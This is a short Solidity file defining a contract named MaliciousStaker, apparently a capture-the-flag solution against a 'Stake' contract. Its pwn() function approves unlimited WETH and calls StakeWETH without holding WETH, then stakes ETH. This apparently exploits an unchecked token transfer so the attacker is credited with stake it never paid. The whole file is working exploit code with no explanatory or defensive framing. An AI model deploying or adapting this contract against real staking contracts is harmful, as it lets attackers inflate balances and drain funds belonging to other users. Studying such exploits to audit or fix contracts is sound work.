// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

import "stake.sol";

contract MaliciousStaker {
    Stake i_stake;
    IWETH i_weth;

    uint256 private defaultStake = 0.001 ether + 1 wei;

    constructor(address _stake_a, address _weth_a) payable {
        require(msg.value >= defaultStake, "Not enough eth sent");
        i_stake = Stake(_stake_a);
        i_weth = IWETH(_weth_a);
    }

    function pwn() external {
        stakeWETH();
        stakeETH();
    }

    function stakeWETH() private {
        i_weth.approve(address(i_stake), type(uint256).max);
        i_stake.StakeWETH(defaultStake);
    }

    function stakeETH() private {
        i_stake.StakeETH{value: defaultStake}();
    } 
}